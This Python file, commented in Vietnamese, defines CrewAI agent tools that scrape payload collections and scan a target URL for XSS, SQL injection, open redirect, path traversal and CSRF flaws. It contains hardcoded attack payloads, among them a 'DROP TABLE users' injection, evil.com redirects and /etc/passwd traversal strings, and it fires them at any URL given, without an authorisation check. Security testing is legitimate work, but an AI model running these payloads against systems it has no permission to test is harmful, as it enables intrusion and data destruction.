import sys
import io
import requests
from bs4 import BeautifulSoup
import json
import re
import os
from urllib.parse import parse_qs, urlparse, urljoin
from crewai.tools import tool

# Danh sách payload XSS
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>'
]

# Danh sách payload SQL Injection
SQLI_PAYLOADS = [
    "'",
    "''",
    '\\\'',
    ";",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "admin' --",
    "1'; DROP TABLE users--"
]

# Danh sách payload Open Redirect
OPEN_REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '\\evil.com',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>'
]

# Danh sách payload Path Traversal
PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '../../../etc/hosts',
    '../../../var/log/apache2/access.log',
    '/etc/passwd',
    'file:///etc/passwd'
]

@tool("Payload Searcher")
def search_payloads(vulnerability_type: str = "xss", source: str = "portswigger") -> str:
    """
    Tìm kiếm và thu thập các payload mới từ các nguồn web khác nhau.
    
    Args:
        vulnerability_type (str): Loại lỗ hổng cần tìm payload (xss, sqli, openredirect, pathtraversal, csrf)
        source (str): Nguồn tìm kiếm (portswigger, github, hacktricks, payload-all-the-things)
        
    Returns:
        str: Danh sách các payload mới dạng JSON
    """
    try:
        vulnerability_type = vulnerability_type.lower()
        source = source.lower()
        
        results = {
            "source": source,
            "vulnerability_type": vulnerability_type,
            "payloads": [],
            "references": []
        }
        
        # PortSwigger XSS Cheat Sheet
        if source == "portswigger" and vulnerability_type == "xss":
            url = "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
            print(f"Searching for XSS payloads from {url}")
            
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    # Get payload examples from PortSwigger page
                    payloads = []
                    
                    # Find all elements with class 'cheat-sheet-item'
                    cheat_sheet_items = soup.find_all('section', class_='cheat-sheet-item')
                    for item in cheat_sheet_items:
                        code_tag = item.find('code')
                        if code_tag:
                            payload = code_tag.text.strip()
                            if payload and len(payload) < 200:  # Limit length to avoid oversized payloads
                                payloads.append(payload)
                    
                    if not payloads:
                        # Fallback method: find all code tags
                        code_tags = soup.find_all('code')
                        for code in code_tags:
                            code_text = code.get_text().strip()
                            if '<' in code_text and '>' in code_text and len(code_text) < 200:
                                payloads.append(code_text)
                    
                    # Filter and add up to 15 payloads
                    payloads = list(set(payloads))[:15]
                    results["payloads"] = payloads
                    results["references"].append({
                        "title": "PortSwigger XSS Cheat Sheet",
                        "url": url
                    })
            except Exception as e:
                print(f"Error searching from PortSwigger: {str(e)}")
        
        # HackTricks
        elif source == "hacktricks":
            base_url = "https://book.hacktricks.xyz"
            url_map = {
                "xss": "/pentesting-web/xss-cross-site-scripting",
                "sqli": "/pentesting-web/sql-injection",
                "openredirect": "/pentesting-web/open-redirect",
                "pathtraversal": "/pentesting-web/file-inclusion",
                "csrf": "/pentesting-web/csrf-cross-site-request-forgery"
            }
            
            if vulnerability_type in url_map:
                url = base_url + url_map[vulnerability_type]
                print(f"Searching for {vulnerability_type} payloads from {url}")
                
                try:
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        payloads = []
                        
                        # Find all code tags
                        code_blocks = soup.find_all(['code', 'pre'])
                        for block in code_blocks:
                            code_text = block.get_text().strip()
                            # Check if code is a potential payload
                            if vulnerability_type == "xss" and ('<' in code_text and '>' in code_text):
                                payloads.append(code_text)
                            elif vulnerability_type == "sqli" and ("'" in code_text or '"' in code_text or "SELECT" in code_text.upper()):
                                payloads.append(code_text)
                            elif vulnerability_type == "openredirect" and ("http" in code_text or "//" in code_text):
                                payloads.append(code_text)
                            elif vulnerability_type == "pathtraversal" and ("../" in code_text or "..\\" in code_text):
                                payloads.append(code_text)
                            
                        # Filter and limit results
                        payloads = [p for p in payloads if len(p) < 200]
                        payloads = list(set(payloads))[:15]
                        results["payloads"] = payloads
                        results["references"].append({
                            "title": f"HackTricks {vulnerability_type.upper()} Guide",
                            "url": url
                        })
                except Exception as e:
                    print(f"Error searching from HackTricks: {str(e)}")
        
        # GitHub - PayloadsAllTheThings
        elif source == "payload-all-the-things" or source == "github":
            github_base = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master"
            url_map = {
                "xss": "/XSS%20Injection/README.md",
                "sqli": "/SQL%20Injection/README.md",
                "openredirect": "/Open%20Redirect/README.md",
                "pathtraversal": "/Directory%20Traversal/README.md",
                "csrf": "/CSRF%20Injection/README.md"
            }
            
            if vulnerability_type in url_map:
                url = github_base + url_map[vulnerability_type]
                print(f"Searching for {vulnerability_type} payloads from PayloadsAllTheThings")
                
                try:
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        markdown_text = response.text
                        payloads = []
                        
                        # Find code blocks in Markdown
                        code_blocks = re.findall(r'```(?:\w+)?\n(.*?)\n```', markdown_text, re.DOTALL)
                        for block in code_blocks:
                            lines = block.split('\n')
                            for line in lines:
                                line = line.strip()
                                if line and len(line) < 200:
                                    # Similar filtering conditions as above
                                    if vulnerability_type == "xss" and ('<' in line and '>' in line):
                                        payloads.append(line)
                                    elif vulnerability_type == "sqli" and ("'" in line or '"' in line or "SELECT" in line.upper()):
                                        payloads.append(line)
                                    elif vulnerability_type == "openredirect" and ("http" in line or "//" in line):
                                        payloads.append(line)
                                    elif vulnerability_type == "pathtraversal" and ("../" in line or "..\\" in line):
                                        payloads.append(line)
                                    elif vulnerability_type == "csrf" and ("<form" in line.lower() or "fetch(" in line):
                                        payloads.append(line)
                        
                        # Get inline code examples
                        inline_codes = re.findall(r'`(.*?)`', markdown_text)
                        for code in inline_codes:
                            if len(code) < 200:
                                # Similar conditions as above
                                if vulnerability_type == "xss" and ('<' in code and '>' in code):
                                    payloads.append(code)
                                elif vulnerability_type == "sqli" and ("'" in code or '"' in code or "SELECT" in code.upper()):
                                    payloads.append(code)
                                elif vulnerability_type == "openredirect" and ("http" in code or "//" in code):
                                    payloads.append(code)
                                elif vulnerability_type == "pathtraversal" and ("../" in code or "..\\" in code):
                                    payloads.append(code)
                        
                        # Filter and limit results
                        payloads = list(set(payloads))[:15]
                        results["payloads"] = payloads
                        results["references"].append({
                            "title": "PayloadsAllTheThings GitHub Repository",
                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings"
                        })
                except Exception as e:
                    print(f"Error searching from PayloadsAllTheThings: {str(e)}")
        
        # If no payloads found, return default list
        if not results["payloads"]:
            if vulnerability_type == "xss":
                results["payloads"] = XSS_PAYLOADS
                results["note"] = "Using default payload list as no new payloads were found"
            elif vulnerability_type == "sqli":
                results["payloads"] = SQLI_PAYLOADS
                results["note"] = "Using default payload list as no new payloads were found"
            elif vulnerability_type == "openredirect":
                results["payloads"] = OPEN_REDIRECT_PAYLOADS
                results["note"] = "Using default payload list as no new payloads were found"
            elif vulnerability_type == "pathtraversal":
                results["payloads"] = PATH_TRAVERSAL_PAYLOADS
                results["note"] = "Using default payload list as no new payloads were found"
        
        return json.dumps(results, ensure_ascii=False)
    except Exception as e:
        return json.dumps({"error": f"Error searching for payloads: {str(e)}"})

def xss_scanner(url, params=None):
    """
    Quét lỗ hổng XSS trên URL và các tham số.
    
    Args:
        url (str): URL cần quét
        params (dict, optional): Các tham số và giá trị để kiểm tra
        
    Returns:
        dict: Kết quả quét XSS
    """
    result = {
        "vulnerable": False,
        "payloads": [],
        "details": []
    }
    
    # Thông báo 
    print(f"Searching for XSS on URL: {url}")
    
    try:
        # Trường hợp không có tham số cụ thể, tự động tìm các tham số từ URL
        if params is None:
            params = {}
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param, values in query_params.items():
                params[param] = values[0] if values else ''
                
        if not params:
            return {
                "vulnerable": False,
                "message": "No parameters found to test for XSS"
            }
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Kiểm tra từng tham số
        for param_name, param_value in params.items():
            # Thử từng payload XSS
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # Kiểm tra xem payload có xuất hiện nguyên vẹn trong phản hồi không
                    if payload in response.text:
                        result["vulnerable"] = True
                        if payload not in result["payloads"]:
                            result["payloads"].append(payload)
                        
                        result["details"].append({
                            "param": param_name,
                            "payload": payload,
                            "status_code": response.status_code
                        })
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return result
        
    except Exception as e:
        print(f"Error during XSS scan: {str(e)}")
        return {
            "error": f"Error during XSS scan: {str(e)}"
        }

def sqli_scanner(url, params=None):
    """
    Quét lỗ hổng SQL Injection trên URL và các tham số.
    
    Args:
        url (str): URL cần quét
        params (dict, optional): Các tham số và giá trị để kiểm tra
        
    Returns:
        dict: Kết quả quét SQL Injection
    """
    result = {
        "vulnerable": False,
        "payloads": [],
        "details": []
    }
    
    # Thông báo
    print(f"Searching for SQL Injection on URL: {url}")
    
    try:
        # Trường hợp không có tham số cụ thể, tự động tìm các tham số từ URL
        if params is None:
            params = {}
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param, values in query_params.items():
                params[param] = values[0] if values else ''
                
        if not params:
            return {
                "vulnerable": False,
                "message": "No parameters found to test for SQL Injection"
            }
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Phương tiện nhận biết lỗi SQL
        sql_errors = [
            "SQL syntax",
            "MySQL",
            "ORA-",
            "Oracle",
            "PostgreSQL",
            "SQLite",
            "Syntax error",
            "ODBC Driver",
            "DB2",
            "Microsoft SQL",
            "OLEDB",
            "Warning:",
            "JDBC Driver",
            "JDBC SQLException",
            "Error Occurred While Processing Request",
            "Server Error",
            "Microsoft JET Database"
        ]
        
        # Kiểm tra từng tham số
        for param_name, param_value in params.items():
            # Thử từng payload SQL Injection
            for payload in SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # Kiểm tra xem có lỗi SQL nào trong phản hồi không
                    for error in sql_errors:
                        if error in response.text:
                            result["vulnerable"] = True
                            if payload not in result["payloads"]:
                                result["payloads"].append(payload)
                            
                            result["details"].append({
                                "param": param_name,
                                "payload": payload,
                                "status_code": response.status_code,
                                "error": error
                            })
                            break
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return result
        
    except Exception as e:
        print(f"Error during SQL Injection scan: {str(e)}")
        return {
            "error": f"Error during SQL Injection scan: {str(e)}"
        }

def open_redirect_scanner(url, params=None):
    """
    Quét lỗ hổng Open Redirect trên URL và các tham số.
    
    Args:
        url (str): URL cần quét
        params (dict, optional): Các tham số và giá trị để kiểm tra
        
    Returns:
        dict: Kết quả quét Open Redirect
    """
    result = {
        "vulnerable": False,
        "payloads": [],
        "details": []
    }
    
    # Thông báo
    print(f"Searching for Open Redirect on URL: {url}")
    
    try:
        # Trường hợp không có tham số cụ thể, tự động tìm các tham số từ URL
        if params is None:
            params = {}
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param, values in query_params.items():
                params[param] = values[0] if values else ''
                
            # Thêm các tham số thường dùng cho chuyển hướng
            redirect_params = ["redirect", "url", "next", "redir", "return", "return_url", "redirect_uri", "redirect_url", "checkout_url", "goto"]
            for param in redirect_params:
                if param not in params:
                    params[param] = ""
                
        if not params:
            return {
                "vulnerable": False,
                "message": "No parameters found to test for Open Redirect"
            }
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Kiểm tra từng tham số
        for param_name, param_value in params.items():
            # Thử từng payload Open Redirect
            for payload in OPEN_REDIRECT_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, headers=headers, timeout=10, allow_redirects=False)
                    
                    # Kiểm tra xem có chuyển hướng không
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        
                        # Kiểm tra xem location có chứa payload không
                        if payload in location:
                            result["vulnerable"] = True
                            if payload not in result["payloads"]:
                                result["payloads"].append(payload)
                            
                            result["details"].append({
                                "param": param_name,
                                "payload": payload,
                                "status_code": response.status_code,
                                "location": location
                            })
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return result
        
    except Exception as e:
        print(f"Error during Open Redirect scan: {str(e)}")
        return {
            "error": f"Error during Open Redirect scan: {str(e)}"
        }

def path_traversal_scanner(url, params=None):
    """
    Quét lỗ hổng Path Traversal trên URL và các tham số.
    
    Args:
        url (str): URL cần quét
        params (dict, optional): Các tham số và giá trị để kiểm tra
        
    Returns:
        dict: Kết quả quét Path Traversal
    """
    result = {
        "vulnerable": False,
        "payloads": [],
        "details": []
    }
    
    # Thông báo
    print(f"Searching for Path Traversal on URL: {url}")
    
    try:
        # Trường hợp không có tham số cụ thể, tự động tìm các tham số từ URL
        if params is None:
            params = {}
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param, values in query_params.items():
                params[param] = values[0] if values else ''
                
            # Thêm các tham số thường dùng cho path traversal
            file_params = ["file", "path", "filepath", "doc", "document", "folder", "dir", "directory", "page", "image", "img"]
            for param in file_params:
                if param not in params:
                    params[param] = ""
                
        if not params:
            return {
                "vulnerable": False,
                "message": "No parameters found to test for Path Traversal"
            }
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Nội dung cần tìm trong file nhạy cảm
        sensitive_content = {
            "../../../etc/passwd": ["root:", "nobody:", "daemon:"],
            "..\\..\\..\\windows\\win.ini": ["for 16-bit", "[fonts]", "[extensions]"],
            "../../../etc/hosts": ["localhost", "127.0.0.1"],
            "/etc/passwd": ["root:", "nobody:", "daemon:"]
        }
        
        # Kiểm tra từng tham số
        for param_name, param_value in params.items():
            # Thử từng payload Path Traversal
            for payload in PATH_TRAVERSAL_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # Kiểm tra xem có nội dung nhạy cảm không
                    if payload in sensitive_content:
                        for content in sensitive_content[payload]:
                            if content in response.text:
                                result["vulnerable"] = True
                                if payload not in result["payloads"]:
                                    result["payloads"].append(payload)
                                
                                result["details"].append({
                                    "param": param_name,
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "content_found": content
                                })
                                break
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return result
        
    except Exception as e:
        print(f"Error during Path Traversal scan: {str(e)}")
        return {
            "error": f"Error during Path Traversal scan: {str(e)}"
        }

def csrf_scanner(url):
    """
    Quét lỗ hổng CSRF trên URL bằng cách kiểm tra form.
    
    Args:
        url (str): URL cần quét
        
    Returns:
        dict: Kết quả quét CSRF
    """
    result = {
        "vulnerable": False,
        "forms": [],
        "details": []
    }
    
    # Thông báo
    print(f"Searching for CSRF on URL: {url}")
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Gửi request để lấy nội dung trang
        response = requests.get(url, headers=headers, timeout=10)
        
        # Phân tích HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Tìm tất cả form
        forms = soup.find_all('form')
        
        # CSRF token có thể có nhiều tên khác nhau
        csrf_token_names = [
            'csrf', 'csrftoken', 'csrf_token', 'csrf-token', 'xsrf', 'xsrf_token', 
            'xsrftoken', 'anti-csrf', 'anti-xsrf', '_token', '_csrf', 'token'
        ]
        
        # Kiểm tra từng form
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').upper()
            
            # Tạo URL đầy đủ
            if form_action:
                form_url = urljoin(url, form_action)
            else:
                form_url = url
                
            # Chỉ quan tâm đến các form POST
            if form_method == 'POST':
                # Tìm tất cả input
                inputs = form.find_all('input')
                input_names = [input_tag.get('name', '') for input_tag in inputs]
                
                # Kiểm tra xem có CSRF token không
                has_csrf_token = False
                for input_name in input_names:
                    if input_name and any(csrf_name in input_name.lower() for csrf_name in csrf_token_names):
                        has_csrf_token = True
                        break
                        
                # Nếu không có CSRF token, form có thể dễ bị tấn công CSRF
                if not has_csrf_token:
                    result["vulnerable"] = True
                    result["forms"].append(form_url)
                    
                    result["details"].append({
                        "url": form_url,
                        "method": form_method,
                        "inputs": input_names
                    })
                    
        return result
        
    except Exception as e:
        print(f"Error during CSRF scan: {str(e)}")
        return {
            "error": f"Error during CSRF scan: {str(e)}"
        }

@tool("XSS Scanner")
def scan_xss(url: str = None) -> str:
    """
    Quét lỗ hổng XSS trên một trang web.
    
    Args:
        url (str, optional): URL trang web cần quét. Nếu không cung cấp, sẽ sử dụng từ target_url.
        
    Returns:
        str: Kết quả quét XSS dạng JSON
    """
    try:
        # Kiểm tra URL từ nhiều nguồn
        if url is None or url.strip() == "":
            # Thử lấy URL từ biến môi trường
            env_url = os.environ.get("TARGET_URL")
            if env_url and env_url.strip() != "":
                url = env_url
                print(f"[XSS Scanner] Using URL from environment variable: {url}")
            else:
                return json.dumps({"error": "URL not provided"})
                
        # Đảm bảo URL bắt đầu bằng http hoặc https
        if not url.startswith(('http://', 'https://')):
            url = "https://" + url
            
        # Trích xuất các tham số từ URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        params = {}
        
        for param, values in query_params.items():
            params[param] = values[0] if values else ''
            
        # Nếu không tìm thấy tham số, thử tìm các form để kiểm tra
        if not params:
            try:
                response = requests.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                forms_count = len(soup.find_all('form'))
                input_fields_count = len(soup.find_all(['input', 'textarea']))
                
                # If the website has forms, note for reporting
                if forms_count > 0 or input_fields_count > 0:
                    result = {
                        "url": url,
                        "forms_found": forms_count,
                        "input_fields_found": input_fields_count,
                        "message": "Found forms and input fields but cannot scan automatically. Manual scanning required."
                    }
                else:
                    result = {
                        "url": url,
                        "message": "No parameters or forms found to test for XSS."
                    }
                
                return json.dumps(result, ensure_ascii=False)
                
            except requests.exceptions.RequestException as e:
                return json.dumps({"error": f"Error connecting to {url}: {str(e)}"})
        
        # Nếu có tham số, thực hiện quét XSS
        result = xss_scanner(url, params)
        return json.dumps(result, ensure_ascii=False)
        
    except Exception as e:
        return json.dumps({"error": f"Error during XSS scan: {str(e)}"})

@tool("SQL Injection Scanner")
def scan_sqli(url: str = None) -> str:
    """
    Quét lỗ hổng SQL Injection trên một trang web.
    
    Args:
        url (str, optional): URL trang web cần quét. Nếu không cung cấp, sẽ sử dụng từ target_url.
        
    Returns:
        str: Kết quả quét SQL Injection dạng JSON
    """
    try:
        # Kiểm tra URL từ nhiều nguồn
        if url is None or url.strip() == "":
            # Thử lấy URL từ biến môi trường
            env_url = os.environ.get("TARGET_URL")
            if env_url and env_url.strip() != "":
                url = env_url
                print(f"[SQLI Scanner] Using URL from environment variable: {url}")
            else:
                return json.dumps({"error": "URL not provided"})
                
        # Đảm bảo URL bắt đầu bằng http hoặc https
        if not url.startswith(('http://', 'https://')):
            url = "https://" + url
            
        # Trích xuất các tham số từ URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        params = {}
        
        for param, values in query_params.items():
            params[param] = values[0] if values else ''
            
        # Nếu không tìm thấy tham số, thử tìm các form để kiểm tra
        if not params:
            try:
                response = requests.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                forms_count = len(soup.find_all('form'))
                input_fields_count = len(soup.find_all(['input', 'textarea']))
                
                # If the website has forms, note for reporting
                if forms_count > 0 or input_fields_count > 0:
                    result = {
                        "url": url,
                        "forms_found": forms_count,
                        "input_fields_found": input_fields_count,
                        "message": "Found forms and input fields but cannot scan automatically. Manual scanning required."
                    }
                else:
                    result = {
                        "url": url,
                        "message": "No parameters or forms found to test for SQL Injection."
                    }
                
                return json.dumps(result, ensure_ascii=False)
                
            except requests.exceptions.RequestException as e:
                return json.dumps({"error": f"Error connecting to {url}: {str(e)}"})
        
        # Nếu có tham số, thực hiện quét SQL Injection
        result = sqli_scanner(url, params)
        return json.dumps(result, ensure_ascii=False)
        
    except Exception as e:
        return json.dumps({"error": f"Error during SQL Injection scan: {str(e)}"})

@tool("Open Redirect Scanner")
def scan_open_redirect(url: str = None) -> str:
    """
    Quét lỗ hổng Open Redirect trên một trang web.
    
    Args:
        url (str, optional): URL trang web cần quét. Nếu không cung cấp, sẽ sử dụng từ target_url.
        
    Returns:
        str: Kết quả quét Open Redirect dạng JSON
    """
    try:
        # Kiểm tra URL từ nhiều nguồn
        if url is None or url.strip() == "":
            # Thử lấy URL từ biến môi trường
            env_url = os.environ.get("TARGET_URL")
            if env_url and env_url.strip() != "":
                url = env_url
                print(f"[Open Redirect Scanner] Using URL from environment variable: {url}")
            else:
                return json.dumps({"error": "URL not provided"})
                
        # Đảm bảo URL bắt đầu bằng http hoặc https
        if not url.startswith(('http://', 'https://')):
            url = "https://" + url
        
        # Trích xuất các tham số từ URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Tìm các tham số liên quan đến chuyển hướng
        redirect_params = {}
        redirect_keywords = ['redirect', 'url', 'link', 'goto', 'return', 'next', 'target', 'redir', 'origin', 'destination', 'return_url', 'r', 'u']
        
        for param, values in query_params.items():
            if any(keyword in param.lower() for keyword in redirect_keywords):
                redirect_params[param] = values[0] if values else ''
                
        # Nếu không tìm thấy tham số chuyển hướng, quét toàn bộ form
        if not redirect_params:
            try:
                response = requests.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                forms_count = len(soup.find_all('form'))
                redirect_links = []
                
                # Tìm các liên kết chuyển hướng
                for a_tag in soup.find_all('a', href=True):
                    href = a_tag['href']
                    if any(keyword in href.lower() for keyword in redirect_keywords):
                        redirect_links.append(href)
                
                result = {
                    "url": url,
                    "forms_found": forms_count,
                    "redirect_links_found": len(redirect_links),
                    "redirect_links": redirect_links[:10],  # Giới hạn 10 liên kết
                    "message": "No redirect parameters found to automatically scan. Manual scanning required."
                }
                
                return json.dumps(result, ensure_ascii=False)
                
            except requests.exceptions.RequestException as e:
                return json.dumps({"error": f"Error connecting to {url}: {str(e)}"})
        
        # Nếu có tham số chuyển hướng, thực hiện quét Open Redirect
        result = open_redirect_scanner(url, redirect_params)
        return json.dumps(result, ensure_ascii=False)
        
    except Exception as e:
        return json.dumps({"error": f"Error during Open Redirect scan: {str(e)}"})

@tool("Path Traversal Scanner")
def scan_path_traversal(url: str = None) -> str:
    """
    Quét lỗ hổng Path Traversal trên một trang web.
    
    Args:
        url (str, optional): URL trang web cần quét. Nếu không cung cấp, sẽ sử dụng từ target_url.
        
    Returns:
        str: Kết quả quét Path Traversal dạng JSON
    """
    try:
        # Kiểm tra URL từ nhiều nguồn
        if url is None or url.strip() == "":
            # Thử lấy URL từ biến môi trường
            env_url = os.environ.get("TARGET_URL")
            if env_url and env_url.strip() != "":
                url = env_url
                print(f"[Path Traversal Scanner] Using URL from environment variable: {url}")
            else:
                return json.dumps({"error": "URL not provided"})
                
        # Đảm bảo URL bắt đầu bằng http hoặc https
        if not url.startswith(('http://', 'https://')):
            url = "https://" + url
        
        # Trích xuất các tham số từ URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Tìm các tham số liên quan đến file/path
        file_params = {}
        file_keywords = ['file', 'path', 'document', 'page', 'filename', 'load', 'read', 'include', 'doc', 'dir', 'folder']
        
        for param, values in query_params.items():
            if any(keyword in param.lower() for keyword in file_keywords):
                file_params[param] = values[0] if values else ''
                
        # Nếu không tìm thấy tham số liên quan đến file, quét toàn bộ URL
        if not file_params and not any(ext in parsed_url.path for ext in ['.php', '.jsp', '.asp', '.aspx']):
            # Kiểm tra xem URL có chứa file extension không
            if '.' in parsed_url.path:
                file_params = {'path': parsed_url.path}
            else:
                result = {
                    "url": url,
                    "message": "No file-related parameters or path found to test for Path Traversal."
                }
                
                return json.dumps(result, ensure_ascii=False)
        
        # Nếu có tham số file hoặc URL có path cụ thể, thực hiện quét Path Traversal
        result = path_traversal_scanner(url, file_params)
        return json.dumps(result, ensure_ascii=False)
        
    except Exception as e:
        return json.dumps({"error": f"Error during Path Traversal scan: {str(e)}"})

@tool("CSRF Scanner")
def scan_csrf(url: str = None) -> str:
    """
    Quét lỗ hổng CSRF trên một trang web.
    
    Args:
        url (str, optional): URL trang web cần quét. Nếu không cung cấp, sẽ sử dụng từ target_url.
        
    Returns:
        str: Kết quả quét CSRF dạng JSON
    """
    try:
        # Kiểm tra URL từ nhiều nguồn
        if url is None or url.strip() == "":
            # Thử lấy URL từ biến môi trường
            env_url = os.environ.get("TARGET_URL")
            if env_url and env_url.strip() != "":
                url = env_url
                print(f"[CSRF Scanner] Using URL from environment variable: {url}")
            else:
                return json.dumps({"error": "URL not provided"})
                
        # Đảm bảo URL bắt đầu bằng http hoặc https
        if not url.startswith(('http://', 'https://')):
            url = "https://" + url
        
        # Thực hiện quét CSRF
        result = csrf_scanner(url)
        return json.dumps(result, ensure_ascii=False)
        
    except Exception as e:
        return json.dumps({"error": f"Error during CSRF scan: {str(e)}"}) 